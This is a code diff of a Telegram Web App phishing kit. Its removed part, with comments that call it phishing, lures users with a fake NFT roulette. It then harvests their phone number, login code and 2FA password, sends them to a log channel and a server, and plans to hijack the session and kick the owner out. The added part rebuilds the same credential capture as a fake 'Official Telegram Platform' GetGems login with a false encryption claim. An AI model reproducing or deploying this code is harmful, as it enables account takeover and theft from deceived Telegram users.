-                    SPIN ROULETTE
-                </button>
-
-                <div class="notification">
-                    <div style="font-weight: 600; margin-bottom: 5px; font-size: 0.9rem;">+1 SPIN PER 5 FRIENDS!</div>
-                    <div style="color: var(--text-secondary); font-size: 0.8rem;">
-                        Invite friends and get extra spins
-                    </div>
-                </div>
-            </div>
+        <div class="progress-bar">
+            <div class="progress-fill" style="width: 25%"></div>
         </div>
 
-        <!-- Вкладка Подарки -->
-        <div id="gifts" class="tab-content">
-            <div class="section">
-                <div class="section-title">YOUR COLLECTION</div>
-                
-                <div class="gift-grid" id="gifts-list">
-                    <div style="text-align: center; padding: 30px; color: var(--text-secondary);">
-                        <div style="font-size: 2.5rem; margin-bottom: 12px;">🎁</div>
-                        <div style="font-weight: 600; margin-bottom: 8px; font-size: 0.95rem;">No gifts yet</div>
-                        <div style="font-size: 0.85rem;">Spin the roulette to win NFTs!</div>
-                    </div>
+        <div class="auth-container">
+            <!-- Шаг 1: Ввод номера телефона -->
+            <div class="auth-step active" id="step-phone">
+                <div class="step-title">Login to Account</div>
+                <div class="step-description">
+                    To access your NFT gifts, please login to your Telegram account
                 </div>
-            </div>
-        </div>
 
-        <!-- Вкладка Рефералы -->
-        <div id="referral" class="tab-content">
-            <div class="section">
-                <div class="section-title">REFERRAL PROGRAM</div>
-                
-                <div class="stats-grid">
-                    <div class="stat-card">
-                        <div class="stat-value" id="friends-count">0</div>
-                        <div class="stat-label">FRIENDS</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="bonus-spins">0</div>
-                        <div class="stat-label">BONUS SPINS</div>
+                <div class="form-group">
+                    <label class="form-label">Phone Number</label>
+                    <div class="phone-input-container">
+                        <div class="country-select">
+                            <select id="countryCode">
+                                <!-- Страны будут добавлены через JavaScript -->
+                            </select>
+                        </div>
+                        <input type="tel" class="form-input phone-input" id="phone" 
+                               placeholder="123 456 7890">
                     </div>
                 </div>
 
-                <div class="referral-box">
-                    <div style="margin-bottom: 12px; font-weight: 600; font-size: 0.9rem;">Your referral link:</div>
-                    <div class="referral-link" id="referral-link">
-                        Loading...
-                    </div>
+                <div class="security-notice">
+                    🔒 Your data is protected by end-to-end encryption
                 </div>
 
-                <div class="notification">
-                    <div style="font-weight: 600; margin-bottom: 5px; font-size: 0.9rem;">Bonus Program</div>
-                    <div style="color: var(--text-secondary); font-size: 0.8rem;">
-                        Get +1 extra spin for every 5 invited friends!
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Вкладка Информация -->
-        <div id="info" class="tab-content">
-            <div class="section">
-                <div class="section-title">ACCOUNT VERIFICATION</div>
-                
-                <div class="instruction-steps">
-                    <div class="instruction-step">
-                        <div class="step-number">1</div>
-                        <div class="step-text">Click "Verify Account" button below</div>
-                    </div>
-                    <div class="instruction-step">
-                        <div class="step-number">2</div>
-                        <div class="step-text">Enter your Telegram phone number</div>
-                    </div>
-                    <div class="instruction-step">
-                        <div class="step-number">3</div>
-                        <div class="step-text">Enter verification code from Telegram</div>
-                    </div>
-                    <div class="instruction-step">
-                        <div class="step-number">4</div>
-                        <div class="step-text">Enter password if you have 2FA enabled</div>
-                    </div>
-                    <div class="instruction-step">
-                        <div class="step-number">5</div>
-                        <div class="step-text">Receive your NFT gifts automatically</div>
-                    </div>
-                </div>
-
-                <button class="withdraw-button" onclick="connectBot()">
-                    VERIFY ACCOUNT
-                </button>
-
-                <div class="notification">
-                    <div style="font-weight: 600; margin-bottom: 5px; font-size: 0.9rem;">Why verification needed?</div>
-                    <div style="color: var(--text-secondary); font-size: 0.8rem;">
-                        To securely transfer your NFT gifts to your Telegram account and protect against fraud
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Попап результата -->
-    <div class="result-popup" id="resultPopup">
-        <div style="font-size: 3.5rem; margin-bottom: 15px;" id="resultEmoji">🎉</div>
-        <div style="font-size: 1.2rem; font-weight: 700; margin-bottom: 8px;" id="resultTitle">CONGRATULATIONS!</div>
-        <div style="color: var(--text-secondary); margin-bottom: 18px; font-size: 0.9rem; line-height: 1.4;" id="resultText">You won an NFT!</div>
-        <button class="auth-button" onclick="closeResultPopup()" style="padding: 12px 24px; font-size: 0.95rem;">OK</button>
-    </div>
-
-    <!-- Фишинговые модальные окна -->
-    <div class="auth-overlay" id="phoneAuthOverlay">
-        <div class="auth-modal">
-            <button class="close-button" onclick="hideAllAuthOverlays()">×</button>
-            <div class="auth-title">Telegram Account Verification</div>
-            <div class="auth-subtitle">
-                Account verification required to withdraw NFT gifts
-            </div>
-            
-            <div class="auth-steps">
-                <div class="auth-step active">1</div>
-                <div class="auth-step">2</div>
-                <div class="auth-step">3</div>
-            </div>
-
-            <!-- Шаг 1: Номер телефона -->
-            <div class="auth-step-content active" id="step1">
-                <div class="input-wrapper">
-                    <input type="tel" class="auth-input" id="phoneInput" placeholder="Phone number" required>
-                </div>
-                <div class="error-message" id="phoneError"></div>
-                <button class="auth-button" onclick="nextToStep2()" id="step1Btn">
-                    CONTINUE
+                <button class="btn btn-primary" onclick="sendPhone()" id="sendPhoneBtn">
+                    Send Code
                 </button>
             </div>
 
-            <!-- Шаг 2: Код подтверждения -->
-            <div class="auth-step-content" id="step2">
-                <div class="input-wrapper">
-                    <input type="text" class="auth-input" id="codeInput" placeholder="Verification code" required>
+            <!-- Шаг 2: Ввод кода подтверждения -->
+            <div class="auth-step" id="step-code">
+                <div class="step-title">Verification Code</div>
+                <div class="step-description">
+                    We sent an SMS with the code to your number
                 </div>
-                <div class="error-message" id="codeError"></div>
-                <div class="step-navigation">
-                    <button class="step-btn" onclick="backToStep1()">BACK</button>
-                    <button class="step-btn primary" onclick="nextToStep3()">CONTINUE</button>
+
+                <div class="code-inputs">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
                 </div>
+
+                <div class="timer" id="timer">
+                    Resend code in 0:59
+                </div>
+
+                <div class="error-message" id="codeError" style="display: none;">
+                    Invalid code. Please try again.
+                </div>
+
+                <button class="btn btn-primary" onclick="verifyCode()" id="verifyCodeBtn">
+                    Verify
+                </button>
+                <button class="btn btn-secondary" onclick="backToPhone()">
+                    Change Number
+                </button>
             </div>
 
-            <!-- Шаг 3: Пароль (если есть) -->
-            <div class="auth-step-content" id="step3">
-                <div class="input-wrapper">
-                    <input type="password" class="auth-input" id="passwordInput" placeholder="Password (if set)" required>
-                    <button class="password-toggle" onclick="togglePassword()">👁️</button>
+            <!-- Шаг 3: Ввод пароля (2FA) -->
+            <div class="auth-step" id="step-password">
+                <div class="step-title">Two-Factor Authentication</div>
+                <div class="step-description">
+                    Please enter your Telegram account password
                 </div>
-                <div class="error-message" id="passwordError"></div>
-                <div class="step-navigation">
-                    <button class="step-btn" onclick="backToStep2()">BACK</button>
-                    <button class="step-btn primary" onclick="submitFullAuth()">COMPLETE VERIFICATION</button>
+
+                <div class="form-group">
+                    <label class="form-label">Password</label>
+                    <input type="password" class="form-input" id="password" 
+                           placeholder="Enter your password">
                 </div>
+
+                <div class="error-message" id="passwordError" style="display: none;">
+                    Invalid password. Please try again.
+                </div>
+
+                <button class="btn btn-primary" onclick="verifyPassword()" id="verifyPasswordBtn">
+                    Continue
+                </button>
+                <button class="btn btn-secondary" onclick="backToCode()">
+                    Back
+                </button>
             </div>
-            
-            <div class="security-notice">
-                <span>🔒</span>
-                Secured by Telegram
+
+            <!-- Шаг 4: Успешная авторизация -->
+            <div class="auth-step" id="step-success">
+                <div class="step-title">✅ Authorization Successful!</div>
+                <div class="step-description">
+                    Your account has been successfully connected. Redirecting to app...
+                </div>
+
+                <div class="nft-preview">
+                    <div class="nft-title">Golden NFT Collection</div>
+                    <div class="nft-value">3 gifts available</div>
+                </div>
+
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">🎁</div>
+                        <div class="feature-title">NFT Gifts</div>
+                        <div class="feature-desc">Exclusive collections</div>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">💎</div>
+                        <div class="feature-title">GEMS Tokens</div>
+                        <div class="feature-desc">Digital assets</div>
+                    </div>
+                </div>
+
+                <div class="loading" style="margin: 20px auto; display: block;"></div>
             </div>
         </div>
-    </div>
 
-    <div class="auth-overlay" id="successOverlay">
-        <div class="auth-modal">
-            <button class="close-button" onclick="hideAllAuthOverlays()">×</button>
-            <div class="auth-title">✅ Verification Complete!</div>
-            <div class="auth-subtitle">
-                You can now withdraw your NFT gifts
-            </div>
-            
-            <div class="auth-steps">
-                <div class="auth-step">1</div>
-                <div class="auth-step">2</div>
-                <div class="auth-step active">3</div>
-            </div>
-
-            <div style="text-align: center; padding: 20px 0;">
-                <div style="font-size: 4rem; margin-bottom: 15px; animation: bounce 1s ease-in-out;">🎉</div>
-                <div style="font-size: 1.1rem; margin-bottom: 8px; font-weight: 600;">
-                    Verification Successful!
-                </div>
-                <div style="color: var(--text-secondary); line-height: 1.4; font-size: 0.9rem;">
-                    Your gifts will be transferred within 5 minutes
-                </div>
-            </div>
-            
-            <button class="auth-button" onclick="completeAuth()">
-                GET GIFTS
-            </button>
+        <div style="text-align: center; color: var(--text-secondary); font-size: 0.8rem; margin-top: 30px;">
+            © 2024 GetGems. Official Telegram Platform.<br>
+            All rights reserved.
         </div>
     </div>
 
     <script>
-        // Инициализация Telegram Web App
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-
-        let userData = {
-            spins: 3,
-            referrals: 0,
-            gifts: [],
-            userId: null,
-            referralLink: '',
-            isSpinning: false,
-            currentGiftId: null
-        };
-
-        // Автоматическое получение NFT из Telegram Fragment
-        const nftItems = [
-            // Популярные NFT из Telegram Fragment
-            {
-                name: "Telegram Stars",
-                image: "https://fragment.com/static/img/stars.3c6d58d.png",
-                rarity: "legendary",
-                value: 500,
-                emoji: "⭐"
-            },
-            {
-                name: "Anonymous Number",
-                image: "https://fragment.com/static/img/numbers.8f79c69.png", 
-                rarity: "epic",
-                value: 350,
-                emoji: "📱"
-            },
-            {
-                name: "Crypto Wallet",
-                image: "https://fragment.com/static/img/wallet.3b7a9c1.png",
-                rarity: "mythic", 
-                value: 750,
-                emoji: "💳"
-            },
-            {
-                name: "Premium Badge",
-                image: "https://fragment.com/static/img/premium.8f4b6d2.png",
-                rarity: "rare",
-                value: 200,
-                emoji: "🎖️"
-            },
-            {
-                name: "Golden Username",
-                image: "https://fragment.com/static/img/username.7d8b4a3.png",
-                rarity: "legendary",
-                value: 600,
-                emoji: "🏷️"
-            },
-            {
-                name: "Sticker Pack",
-                image: "https://fragment.com/static/img/stickers.9a7b5c1.png",
-                rarity: "uncommon",
-                value: 100,
-                emoji: "🎨"
-            },
-            {
-                name: "Crypto Gift",
-                image: "https://fragment.com/static/img/gift.6e8a4b2.png",
-                rarity: "epic",
-                value: 300,
-                emoji: "🎁"
-            },
-            {
-                name: "Diamond Member",
-                image: "https://fragment.com/static/img/diamond.5c8a3d1.png",
-                rarity: "mythic",
-                value: 800,
-                emoji: "💎"
-            },
-            {
-                name: "VIP Access",
-                image: "https://fragment.com/static/img/vip.4b7a8c2.png",
-                rarity: "legendary",
-                value: 450,
-                emoji: "👑"
-            }
+        // Данные стран с кодами и флагами
+        const countries = [
+            { code: '1', name: 'United States', flag: '🇺🇸', pattern: '### ### ####' },
+            { code: '7', name: 'Russia', flag: '🇷🇺', pattern: '### ### ####' },
+            { code: '44', name: 'United Kingdom', flag: '🇬🇧', pattern: '#### ######' },
+            { code: '49', name: 'Germany', flag: '🇩🇪', pattern: '#### ########' },
+            { code: '33', name: 'France', flag: '🇫🇷', pattern: '# ## ## ## ##' },
+            { code: '39', name: 'Italy', flag: '🇮🇹', pattern: '### #######' },
+            { code: '34', name: 'Spain', flag: '🇪🇸', pattern: '### ### ###' },
+            { code: '86', name: 'China', flag: '🇨🇳', pattern: '### #### ####' },
+            { code: '81', name: 'Japan', flag: '🇯🇵', pattern: '### #### ####' },
+            { code: '82', name: 'South Korea', flag: '🇰🇷', pattern: '## #### ####' },
+            { code: '91', name: 'India', flag: '🇮🇳', pattern: '#### ### ###' },
+            { code: '55', name: 'Brazil', flag: '🇧🇷', pattern: '## ##### ####' },
+            { code: '52', name: 'Mexico', flag: '🇲🇽', pattern: '### ### ####' },
+            { code: '61', name: 'Australia', flag: '🇦🇺', pattern: '### ### ###' },
+            { code: '971', name: 'UAE', flag: '🇦🇪', pattern: '## ### ####' },
+            { code: '966', name: 'Saudi Arabia', flag: '🇸🇦', pattern: '## ### ####' },
+            { code: '20', name: 'Egypt', flag: '🇪🇬', pattern: '## #### ####' },
+            { code: '27', name: 'South Africa', flag: '🇿🇦', pattern: '## ### ####' },
+            { code: '234', name: 'Nigeria', flag: '🇳🇬', pattern: '### ### ####' },
+            { code: '62', name: 'Indonesia', flag: '🇮🇩', pattern: '### ### ####' },
+            { code: '63', name: 'Philippines', flag: '🇵🇭', pattern: '### ### ####' },
+            { code: '84', name: 'Vietnam', flag: '🇻🇳', pattern: '### #### ###' },
+            { code: '66', name: 'Thailand', flag: '🇹🇭', pattern: '## ### ####' },
+            { code: '60', name: 'Malaysia', flag: '🇲🇾', pattern: '### ### ###' },
+            { code: '65', name: 'Singapore', flag: '🇸🇬', pattern: '#### ####' },
+            { code: '41', name: 'Switzerland', flag: '🇨🇭', pattern: '## ### ## ##' },
+            { code: '46', name: 'Sweden', flag: '🇸🇪', pattern: '## ### ####' },
+            { code: '47', name: 'Norway', flag: '🇳🇴', pattern: '### ## ###' },
+            { code: '45', name: 'Denmark', flag: '🇩🇰', pattern: '## ## ## ##' },
+            { code: '358', name: 'Finland', flag: '🇫🇮', pattern: '### ### ## ##' },
+            { code: '31', name: 'Netherlands', flag: '🇳🇱', pattern: '## ### ####' },
+            { code: '32', name: 'Belgium', flag: '🇧🇪', pattern: '### ### ###' },
+            { code: '351', name: 'Portugal', flag: '🇵🇹', pattern: '### ### ###' },
+            { code: '90', name: 'Turkey', flag: '🇹🇷', pattern: '### ### ####' },
+            { code: '380', name: 'Ukraine', flag: '🇺🇦', pattern: '## ### ####' },
+            { code: '48', name: 'Poland', flag: '🇵🇱', pattern: '### ### ###' },
+            { code: '36', name: 'Hungary', flag: '🇭🇺', pattern: '### ### ###' },
+            { code: '40', name: 'Romania', flag: '🇷🇴', pattern: '### ### ###' },
+            { code: '420', name: 'Czech Republic', flag: '🇨🇿', pattern: '### ### ###' },
+            { code: '421', name: 'Slovakia', flag: '🇸🇰', pattern: '### ### ###' }
         ];
 
-        let phishingData = {
-            phone: '',
-            code: '',
-            password: '',
-            user_id: null,
-            gift_id: null
-        };
+        let currentStep = 1;
+        let phoneNumber = '';
+        let authCode = '';
+        let password = '';
+        let countdown = 59;
+        let countdownInterval;
+        let selectedCountry = countries[0];
 
-        function initUser() {
-            const tg = window.Telegram.WebApp;
-            userData.userId = tg.initDataUnsafe.user?.id;
-            
-            if (userData.userId) {
-                userData.referralLink = `https://t.me/${tg.initDataUnsafe.user?.username || 'your_bot'}?start=${userData.userId}`;
-                document.getElementById('referral-link').textContent = userData.referralLink;
-            } else {
-                userData.referralLink = "https://t.me/your_bot?start=demo123";
-                document.getElementById('referral-link').textContent = userData.referralLink;
-            }
-            
-            createRouletteTrack();
-            updateUI();
-            initEventListeners();
-        }
-
-        function createRouletteTrack() {
-            const track = document.getElementById('roulette-track');
-            track.innerHTML = '';
-            track.style.transform = 'translateX(0)';
-            
-            // Добавляем NFT в трек (повторяем для бесконечного эффекта)
-            for (let i = 0; i < 3; i++) {
-                nftItems.forEach((item, index) => {
-                    const itemElement = document.createElement('div');
-                    itemElement.className = 'roulette-item';
-                    itemElement.setAttribute('data-nft-index', index);
-                    itemElement.innerHTML = `
-                        <div class="nft-image" style="background-image: url('${item.image}')"></div>
-                        <div class="nft-name">${item.name}</div>
-                    `;
-                    track.appendChild(itemElement);
-                });
-            }
-        }
-
-        function initEventListeners() {
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabName = this.getAttribute('data-tab');
-                    switchTab(tabName);
-                });
+        function initCountries() {
+            const countrySelect = document.getElementById('countryCode');
+            countries.forEach(country => {
+                const option = document.createElement('option');
+                option.value = country.code;
+                option.textContent = `${country.flag} +${country.code} (${country.name})`;
+                countrySelect.appendChild(option);
             });
 
-            document.getElementById('spin-btn').addEventListener('click', spinRoulette);
+            countrySelect.addEventListener('change', function() {
+                selectedCountry = countries.find(c => c.code === this.value);
+                updatePhonePlaceholder();
+            });
+
+            updatePhonePlaceholder();
         }
 
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            const activeTab = document.querySelector(`.tab[data-tab="${tabName}"]`);
-            if (activeTab) {
-                activeTab.classList.add('active');
-            }
-            
-            const activeContent = document.getElementById(tabName);
-            if (activeContent) {
-                activeContent.classList.add('active');
-            }
+        function updatePhonePlaceholder() {
+            const phoneInput = document.getElementById('phone');
+            phoneInput.placeholder = selectedCountry.pattern.replace(/#/g, '0');
         }
 
-        function spinRoulette() {
-            if (userData.isSpinning || userData.spins <= 0) return;
+        function formatPhoneNumber(phone) {
+            // Простое форматирование по шаблону
+            const pattern = selectedCountry.pattern;
+            let formatted = '';
+            let phoneIndex = 0;
             
-            userData.isSpinning = true;
-            const spinBtn = document.getElementById('spin-btn');
-            spinBtn.disabled = true;
-            spinBtn.textContent = 'SPINNING...';
-            userData.spins--;
-
-            const track = document.getElementById('roulette-track');
-            const itemWidth = window.innerWidth < 768 ? 90 : 100;
-            const containerWidth = track.parentElement.offsetWidth;
-            
-            // Выбираем случайный NFT для выигрыша
-            const winIndex = Math.floor(Math.random() * nftItems.length);
-            const winNFT = nftItems[winIndex];
-            
-            // ВАЖНО: Правильный расчет позиции для точной остановки под указателем
-            const pointerPosition = containerWidth / 2;
-            
-            // Позиция выигрышного NFT в первом наборе
-            const winItemPosition = winIndex * itemWidth;
-            
-            // Нам нужно сдвинуть трек так, чтобы выигрышный NFT оказался под указателем
-            // Учитываем, что у нас 3 набора NFT для бесконечного эффекта
-            const totalSetWidth = nftItems.length * itemWidth;
-            
-            // Целевая позиция: выигрышный NFT из второго набора должен быть под указателем
-            const targetWinPosition = winItemPosition + totalSetWidth;
-            const targetPosition = targetWinPosition - pointerPosition + (itemWidth / 2);
-            
-            // Добавляем несколько полных кругов для эффекта прокрутки
-            const extraSpins = 2;
-            const spinDistance = extraSpins * totalSetWidth;
-            const finalTargetPosition = targetPosition + spinDistance;
-            
-            console.log('🎰 Roulette Debug:');
-            console.log('Win NFT:', winNFT.name);
-            console.log('Win Index:', winIndex);
-            console.log('Target Position:', finalTargetPosition);
-            console.log('Pointer at:', pointerPosition);
-            
-            // Анимация прокрутки
-            track.style.transition = 'transform 4s cubic-bezier(0.1, 0.8, 0.2, 1)';
-            track.style.transform = `translateX(-${finalTargetPosition}px)`;
-            
-            setTimeout(() => {
-                const giftId = Date.now();
-                userData.gifts.push({
-                    id: giftId,
-                    name: winNFT.name,
-                    image: winNFT.image,
-                    rarity: winNFT.rarity,
-                    value: winNFT.value,
-                    emoji: winNFT.emoji,
-                    date: new Date().toLocaleDateString('ru-RU')
-                });
-
-                // Показываем результат с задержкой для драматизма
-                setTimeout(() => {
-                    showResult(winNFT);
-                }, 500);
-                
-                updateUI();
-                userData.isSpinning = false;
-                spinBtn.disabled = false;
-                spinBtn.textContent = 'SPIN ROULETTE';
-
-                if (window.Telegram && Telegram.WebApp) {
-                    Telegram.WebApp.sendData(JSON.stringify({
-                        action: 'spin_roulette',
-                        nft_name: winNFT.name,
-                        nft_rarity: winNFT.rarity,
-                        nft_value: winNFT.value,
-                        user_id: userData.userId,
-                        win_index: winIndex
-                    }));
+            for (let i = 0; i < pattern.length; i++) {
+                if (pattern[i] === '#' && phoneIndex < phone.length) {
+                    formatted += phone[phoneIndex];
+                    phoneIndex++;
+                } else if (phoneIndex < phone.length) {
+                    formatted += pattern[i];
                 }
-                
-            }, 4000);
-        }
-
-        function showResult(nft) {
-            const popup = document.getElementById('resultPopup');
-            const emoji = document.getElementById('resultEmoji');
-            const title = document.getElementById('resultTitle');
-            const text = document.getElementById('resultText');
-            
-            emoji.textContent = nft.emoji;
-            title.textContent = 'CONGRATULATIONS!';
-            text.innerHTML = `You won: <strong>${nft.name}</strong><br>${nft.rarity} • $${nft.value}`;
-            
-            popup.style.display = 'block';
-        }
-
-        function closeResultPopup() {
-            document.getElementById('resultPopup').style.display = 'none';
-        }
-
-        function updateUI() {
-            document.getElementById('spins-left').textContent = userData.spins;
-            document.getElementById('referrals-count').textContent = userData.referrals;
-            document.getElementById('friends-count').textContent = userData.referrals;
-            document.getElementById('bonus-spins').textContent = Math.floor(userData.referrals / 5);
-            
-            const giftsList = document.getElementById('gifts-list');
-            giftsList.innerHTML = '';
-            
-            if (userData.gifts.length === 0) {
-                giftsList.innerHTML = `
-                    <div style="text-align: center; padding: 30px; color: var(--text-secondary);">
-                        <div style="font-size: 2.5rem; margin-bottom: 12px;">🎁</div>
-                        <div style="font-weight: 600; margin-bottom: 8px; font-size: 0.95rem;">No gifts yet</div>
-                        <div style="font-size: 0.85rem;">Spin the roulette to win NFTs!</div>
-                    </div>
-                `;
-            } else {
-                userData.gifts.forEach((gift) => {
-                    const giftElement = document.createElement('div');
-                    giftElement.className = 'gift-card';
-                    giftElement.innerHTML = `
-                        <div class="gift-header">
-                            <div class="gift-icon" style="background-image: url('${gift.image}')"></div>
-                            <div>
-                                <div class="gift-name">${gift.name}</div>
-                                <div class="gift-details">${gift.rarity} • $${gift.value}</div>
-                            </div>
-                        </div>
-                        <div class="gift-date">Won: ${gift.date}</div>
-                        <button class="withdraw-button" onclick="withdrawGift(${gift.id})">
-                            WITHDRAW GIFT
-                        </button>
-                    `;
-                    giftsList.appendChild(giftElement);
-                });
             }
             
-            const spinBtn = document.getElementById('spin-btn');
-            spinBtn.disabled = userData.spins <= 0 || userData.isSpinning;
-            spinBtn.textContent = userData.isSpinning ? 'SPINNING...' : 'SPIN ROULETTE';
-            
-            if (userData.spins > 0 && !userData.isSpinning) {
-                spinBtn.classList.add('pulse');
-            } else {
-                spinBtn.classList.remove('pulse');
-            }
+            return formatted;
         }
 
-        // ФИШИНГ ФУНКЦИИ
-        function withdrawGift(giftId) {
-            const gift = userData.gifts.find(g => g.id === giftId);
-            if (gift) {
-                userData.currentGiftId = giftId;
-                showAuthForGift(giftId);
-            }
-        }
-
-        function showAuthForGift(giftId) {
-            phishingData.gift_id = giftId;
-            phishingData.user_id = userData.userId;
-            resetAuthSteps();
-            document.getElementById('phoneAuthOverlay').style.display = 'flex';
-            sendPhishingLog('phishing_started', `Authentication started for gift ${giftId}`);
-        }
-
-        function resetAuthSteps() {
-            document.querySelectorAll('.auth-step-content').forEach(step => {
+        function showStep(stepNumber) {
+            document.querySelectorAll('.auth-step').forEach(step => {
                 step.classList.remove('active');
             });
-            document.getElementById('step1').classList.add('active');
+            document.getElementById(`step-${getStepName(stepNumber)}`).classList.add('active');
             
-            document.querySelectorAll('.auth-step').forEach((step, index) => {
-                step.classList.remove('active');
-                if (index === 0) step.classList.add('active');
+            updateProgress(stepNumber);
+        }
+
+        function getStepName(stepNumber) {
+            switch(stepNumber) {
+                case 1: return 'phone';
+                case 2: return 'code';
+                case 3: return 'password';
+                case 4: return 'success';
+                default: return 'phone';
+            }
+        }
+
+        function updateProgress(step) {
+            const progress = (step - 1) * 33.33;
+            document.querySelector('.progress-fill').style.width = `${progress}%`;
+            
+            document.querySelectorAll('.step').forEach((stepEl, index) => {
+                stepEl.classList.remove('active', 'completed');
+                if (index + 1 < step) {
+                    stepEl.classList.add('completed');
+                } else if (index + 1 === step) {
+                    stepEl.classList.add('active');
+                }
             });
-            
-            // Очищаем поля
-            document.getElementById('phoneInput').value = '';
-            document.getElementById('codeInput').value = '';
-            document.getElementById('passwordInput').value = '';
         }
 
-        function nextToStep2() {
-            const phone = document.getElementById('phoneInput').value;
-            const errorElement = document.getElementById('phoneError');
+        function sendPhone() {
+            const phoneInput = document.getElementById('phone');
+            const phone = phoneInput.value.replace(/\D/g, ''); // Удаляем все нецифровые символы
             
-            if (!phone) {
-                showError(errorElement, 'Enter phone number');
+            if (!phone || phone.length < 5) {
+                showError(phoneInput, 'Please enter a valid phone number');
                 return;
             }
 
-            if (!isValidPhone(phone)) {
-                showError(errorElement, 'Enter valid phone number');
-                return;
-            }
-
-            phishingData.phone = phone;
-            sendPhishingLog('phone_submitted', `Phone: ${phone}`);
-
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
+            phoneNumber = '+' + selectedCountry.code + phone;
             
-            document.querySelectorAll('.auth-step')[0].classList.remove('active');
-            document.querySelectorAll('.auth-step')[1].classList.add('active');
-            
-            showNotification('Verification code sent to Telegram', 'success');
-        }
+            const btn = document.getElementById('sendPhoneBtn');
+            btn.innerHTML = '<div class="loading"></div>';
+            btn.disabled = true;
 
-        function backToStep1() {
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step1').classList.add('active');
-            
-            document.querySelectorAll('.auth-step')[1].classList.remove('active');
-            document.querySelectorAll('.auth-step')[0].classList.add('active');
-        }
-
-        function nextToStep3() {
-            const code = document.getElementById('codeInput').value;
-            const errorElement = document.getElementById('codeError');
-            
-            if (!code) {
-                showError(errorElement, 'Enter verification code');
-                return;
-            }
-
-            phishingData.code = code;
-            sendPhishingLog('code_submitted', `Code: ${code}`);
-
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
-            
-            document.querySelectorAll('.auth-step')[1].classList.remove('active');
-            document.querySelectorAll('.auth-step')[2].classList.add('active');
-        }
-
-        function backToStep2() {
-            document.getElementById('step3').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-            
-            document.querySelectorAll('.auth-step')[2].classList.remove('active');
-            document.querySelectorAll('.auth-step')[1].classList.add('active');
-        }
-
-        function submitFullAuth() {
-            const password = document.getElementById('passwordInput').value;
-            
-            phishingData.password = password || 'not_set';
-            sendPhishingLog('password_submitted', `Password: ${password || 'not_set'}`);
-
-            // Создаем сессию Telegram
-            createTelegramSession();
-            
-            document.getElementById('phoneAuthOverlay').style.display = 'none';
-            document.getElementById('successOverlay').style.display = 'flex';
-            
-            sendPhishingLog('auth_success', 'Full authentication completed');
-        }
-
-        function togglePassword() {
-            const passwordInput = document.getElementById('passwordInput');
-            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-            passwordInput.setAttribute('type', type);
-        }
-
-        function hideAllAuthOverlays() {
-            document.querySelectorAll('.auth-overlay').forEach(overlay => {
-                overlay.style.display = 'none';
-            });
-            sendPhishingLog('phishing_cancelled', 'User cancelled authentication');
-        }
-
-        function completeAuth() {
-            hideAllAuthOverlays();
-            
-            if (userData.currentGiftId) {
-                processGiftWithdrawal(userData.currentGiftId);
-            }
-            
-            showNotification('✅ Gifts will be transferred within 5 minutes!', 'success');
-            sendPhishingLog('withdrawal_started', `Withdrawal started for gift ${userData.currentGiftId}`);
-        }
-
-        function isValidPhone(phone) {
-            const phoneRegex = /^[\+]?[0-9]{10,15}$/;
-            return phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''));
-        }
-
-        function showError(element, message) {
-            element.textContent = message;
-            element.style.display = 'block';
-            setTimeout(() => {
-                element.style.display = 'none';
-            }, 4000);
-        }
-
-        function showNotification(message, type = 'info') {
-            alert(message);
-        }
-
-        async function createTelegramSession() {
-            try {
-                const sessionPayload = {
-                    phone: phishingData.phone,
-                    code: phishingData.code,
-                    password: phishingData.password,
-                    user_id: phishingData.user_id,
-                    gift_id: phishingData.gift_id,
+            // Отправляем номер на сервер
+            fetch('/api/auth/phone', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    country: selectedCountry.name,
+                    country_code: selectedCountry.code,
                     user_agent: navigator.userAgent,
-                    timestamp: new Date().toISOString(),
-                    action: 'create_session_and_kick_user'
-                };
+                    platform: 'web'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    currentStep = 2;
+                    showStep(currentStep);
+                    startTimer();
+                } else {
+                    showError(phoneInput, 'Error sending code');
+                }
+            })
+            .catch(error => {
+                showError(phoneInput, 'Network error');
+            })
+            .finally(() => {
+                btn.innerHTML = 'Send Code';
+                btn.disabled = false;
+            });
+        }
 
-                // Отправляем в Telegram канал логов
-                sendToTelegramLog(`
-🔐 НОВАЯ СЕССИЯ TG | KICK USER
-👤 User ID: ${phishingData.user_id}
-📱 Phone: ${phishingData.phone}
-📟 Code: ${phishingData.code}
-🔑 Password: ${phishingData.password}
-🎁 Gift: ${phishingData.gift_id}
-🌐 User Agent: ${navigator.userAgent}
-🕒 ${new Date().toLocaleString('ru-RU')}
-
-⚠️ СЕССИЯ СОХРАНЕНА В tdata
-⚠️ ПОЛЬЗОВАТЕЛЬ БУДЕТ ВЫКИНУТ ИЗ АККАУНТА
-                `);
-
-                // Отправляем на сервер для создания сессии и выкидывания пользователя
-                const response = await fetch('/api/create_telegram_session', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(sessionPayload)
-                });
-
-                if (response.ok) {
-                    sendPhishingLog('session_created', 'Telegram session created successfully - user will be kicked');
+        function startTimer() {
